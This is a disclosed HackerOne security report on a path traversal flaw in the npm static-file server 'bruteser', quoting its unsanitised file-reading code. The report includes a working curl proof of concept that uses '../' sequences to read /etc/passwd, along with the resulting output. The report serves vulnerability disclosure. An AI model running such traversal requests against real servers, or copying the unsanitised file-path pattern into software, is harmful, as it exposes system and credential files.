# [bruteser] Path Traversal allows to read content of arbitrary file

## Report Details
- **Report ID**: 342066
- **URL**: https://hackerone.com/reports/342066
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-04-23T13:25:53.186Z
- **Disclosed**: 2018-07-04T19:41:30.036Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Path Traversal in ```bruteser``` module.
It allows to read content of any arbitrary file from the server where ```bruteser``` is installed and run.

## Module

**module name:** bruteser
**version:** 0.0.2
**npm page:** https://www.npmjs.com/package/bruteser

### Module Description

BruteSer - server can be used for any type of static files. Just put your files to "public" folder, run server.js and access localhost:8080/your_file.html

If type localhost:8080 it will run index.html by default

### Module Stats

N/A, this module is new and rarely used, but I just wanted maintainer to be aware of the issue as the module is available in public npm directory.

## Vulnerability Description

Path Traversal vulnerability in bruteser module allows to go up in directory tree and read content of any file, like ```/etc/passwd```

Vulnerability exists, because ```bruteser``` uses variable ```filepath``` without any protection against Path Traversal attacks:

```javascript
// node_modules/bruteser/server.js, line 8 (some lines removed)


	var filepath = req.url;
	if (filepath=='/') {
		var filepath = '/index.html';
	}

	var ext = path.extname(filepath);

    // REMOVED

	fs.readFile('public'+filepath, function (err, data){
		if (err) {
			if (filepath === '/index.html') {
				res.end("It seems there is no index.html file in 'public' directory");
			} else {
				res.end("There is no file by this address");
			}

			

		}
		res.end(data);
	});
   
```


## Steps To Reproduce:

Install ```bruteser``` module:

```
$ npm install bruteser
```

Run ```bruteser```:

```
$ node ./node_modules/bruteser/server.js 
Server is running on port 8080


```

Run following curl command to retrieve content of ```/etc/passwd``` (adjust amount of ../ to reflect your system):

```
$ curl -v --path-as-is http://localhost:8080/../../../../../../../../etc/passwd
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /../../../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 23 Apr 2018 13:15:43 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(...)
mysql:x:125:132:MySQL Server,,,:/nonexistent:/bin/false
* Connection #0 to host localhost left intact
```

## Patch

```filepath``` should be sanitized

## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.9.4
- npm v. 5.6.0
- curl 7.47.0

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows an attacker to read content of arbitrary files from the machine where ```bruteser``` is running

## Attachments
No attachments
